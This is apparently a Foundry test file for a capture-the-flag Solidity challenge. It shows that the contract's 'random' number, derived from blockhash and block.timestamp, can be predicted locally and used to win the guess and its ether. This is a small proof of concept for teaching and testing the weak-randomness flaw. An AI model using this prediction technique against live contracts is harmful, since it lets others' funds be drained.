
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge target;

    function setUp() public {
        vm.deal(address(this), 5 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        
        // --- 1. Constraints ---
        blockNumber = bound(blockNumber, 1, 10000000);
        blockTimestamp = bound(blockTimestamp, 1, 2000000000);

        // --- 2. State Configuration ---
        
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Deploying the contract here to simulate the environment where the random number is generated.
        target = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally inside the test.
        // The contract uses blockhash(block.number - 1) and block.timestamp to generate the answer.
        bytes32 prevBlockHash = blockhash(blockNumber - 1);
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(prevBlockHash, blockTimestamp))));
                
        // Call the contract method.
        target.guess{value: 1 ether}(predictedAnswer);

        // Prove that the contract's "random" value matches our calculated expectation.
        assertTrue(target.isComplete(), "The challenge should be completed using the predicted random value");
    }
}
